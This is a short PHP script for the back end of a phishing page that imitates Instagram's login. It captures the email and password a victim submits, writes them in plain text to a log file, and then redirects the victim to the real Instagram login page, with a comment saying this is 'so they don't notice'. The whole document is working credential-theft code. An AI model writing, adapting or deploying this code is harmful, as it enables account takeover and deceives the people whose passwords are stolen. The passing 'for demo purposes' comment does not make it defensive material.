<?php
// Capture the login form data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Save the captured data to a log file (for demo purposes, use a secure way to handle sensitive data in practice)
    $file = 'log.txt'; // Make sure this file is secured and not publicly accessible
    $handle = fopen($file, 'a');
    fwrite($handle, "Email: $email\nPassword: $password\n\n");
    fclose($handle);

    // Redirect the user to the actual login page (so they don’t notice)
    header('Location: https://www.instagram.com/login');
    exit();
} else {
    // If not POST request, just show an error or redirect to the fake page
    echo "Error: Invalid request.";
}
?>
